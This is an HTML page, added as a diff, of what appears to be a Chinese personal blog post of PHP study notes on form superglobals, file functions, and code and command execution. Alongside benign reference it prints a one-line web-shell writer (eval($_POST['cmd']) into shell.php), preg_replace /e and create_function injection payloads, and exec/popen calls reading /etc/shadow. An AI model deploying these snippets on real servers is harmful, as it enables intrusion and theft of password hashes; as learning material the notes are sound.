@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="表单处理
+三种接收表单数据的方式$_GET、$_POST、$_REQUEST
+
+特性：
+超全局变量
+都是数组
+
+
+
+121.	$_GET	此方式接收表单的method=&amp;apos;get&amp;apos;方式传递的值
+122.	$_POST	此方式接收表单的method=&amp;apos;post&amp;apos;方">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="xiaoli24680">
+    
+
+    <!-- Title -->
+    
+    <title>php表单+文件+代码、命令执行 | xiaoli24680&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+
+    <!-- Content -->
+    <section class="article-container">
+<!-- Back Home -->
+<a class="nav-back" href="/">
+    <i class="fa fa-puzzle-piece"></i>
+</a>
+
+<!-- Page Header -->
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>php表单+文件+代码、命令执行</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h1 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h1><ul>
+<li><p>三种接收表单数据的方式<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code></p>
+<ul>
+<li>特性：<ul>
+<li>超全局变量</li>
+<li>都是数组</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.	$_GET</span><br><span class="line">	此方式接收表单的method=&apos;get&apos;方式传递的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.	$_POST</span><br><span class="line">	此方式接收表单的method=&apos;post&apos;方式传递的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.	$_REQUEST</span><br><span class="line">	此方式接收表单get/post方式传递的值</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>超全局变量$_SERVER：用于收集客户端请求信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_ADDR&apos;]		返回当前运行脚本所在的服务器的IP地址</span><br><span class="line">$_SERVER[&apos;REMOTE_ADDR&apos;]		返回浏览当前页面的用户的IP地址</span><br><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]		服务器主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_HOST&apos;]		用户的主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_PORT&apos;]		用户连接到服务器的端口号</span><br><span class="line">$_SERVER[&apos;HTTP_HOST&apos;]		返回来自当前请求的Host头</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]	来源IP地址（从哪个IP地址跳转过来的）</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><ul>
+<li><p><code>fopen()</code>：打开文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(文件名,打开文件的方式);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>打开文件常用的方式：<ul>
+<li><code>r</code>：只读方式打开，指针位置在文件开头</li>
+<li><code>r+</code>：读写方式打开，指针位置在文件开头</li>
+<li><code>w</code>：写入方式打开，清空文件内容，如果文件不存在则创建</li>
+<li><code>w+</code>：读写方式打开，清空文件内容，如果文件不存在则创建</li>
+<li><code>a</code>：追加，打开并向文件末尾进行写操作，如果文件不存在则创建</li>
+<li><code>a+</code>：可读并追加。通过向文件末尾写内容，来保持文件内容</li>
+<li><code>x</code>：只写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li>
+<li><code>x+</code>：读写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>fgets()</code>：逐行读取文件，每次只读取一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(文件名);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fread()</code>：按长度读取文件的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(文件名，长度);			换行也算一个长度</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fwrite()</code>：写入文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(文件名，内容);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fputs</code>：<code>fwrite()</code>的别名</p>
+</li>
+<li><p><code>fclose()</code>：关闭一个打开的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fclose(文件名);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>feof()</code>：检测指针是否已到达文件末尾</p>
+<ul>
+<li>可以结合while循环来读取文件中所有的内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);</span><br><span class="line">while(!feof($file))			//如果达到末尾，会返回TRUE</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>unlink()</code>：删除文件</p>
+</li>
+<li><p><code>opendir()</code>：打开文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = opendir(目录);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>readdir()</code>：读取文件夹（从目录句柄中读取条目）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readdir($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>closedir()</code>：关闭文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">closedir($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>file_exists()</code>：检查文件或目录是否存在</p>
+</li>
+<li><p><code>copy()</code>：复制文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(源文件名,复制后的文件名);		可以移动的同时重命名文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>rename()</code>：重命名文件或目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(源文件名,新文件名);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>file_get_contents()</code>：把整个文件读入一个字符串中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(文件[,include_path,context,start,max_length])</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>file_put_contents</code>：把一个字符串写入文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename,$data)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>用文件操作写一句话：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul>
+<li><p><code>eval()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数里可以使用单引号或者双引号</span><br><span class="line">使用单引号：变量不转义</span><br><span class="line">使用双引号：变量被转义</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>assert()</code></p>
+</li>
+<li><p><code>preg_replace()</code>：正则里面使用<code>/e</code>模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>create_function()</code>：创建函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code>：动态创建函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要求：PHP版本5.2以下才可以使用</span><br><span class="line">在地址栏中使用：a=assert&amp;b=phpinfo()	即可打印PHPinfo</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
+<li><p>exec()：使用它必须在第二个参数指定一个变量来接收执行的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;cat /etc/shadow&quot;,$output);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>system()：命令会直接执行，无需变量接收</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;phpinfo()&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>popen()：此函数是打开一个进程，可读取此进程的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);</span><br><span class="line">echo fread($file,5000);</span><br><span class="line">pclose($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>shell_exec()：此函数需要一个变量在外接收它的结果并输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&apos;ls -al&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+ 
+                <!-- Meta -->
+                <div class="post-meta">
+                    <hr>
+                    <br>
+                    <div class="post-tags">
+                        
+                    </div>
+                    <div class="post-date">
+                        2018 年 12 月 20 日
+                    </div>
+                </div>
+            </div>
+
+            <!-- Comments -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <!-- Disqus Comments -->
+
+
+            </div>
+        </div>
+    </div>
+</article>
+</section>
+
+    <!-- Scripts -->
+    <!-- jQuery -->
+<script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<!-- Bootstrap -->
+<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<script type="text/javascript">
+	console.log('Hexo-theme-hollow designed by zchen9 🙋 © 2015-' + (new Date()).getFullYear());
+</script>
+
+    <!-- Google Analytics -->
+    
+
+</body>
+
+</html>
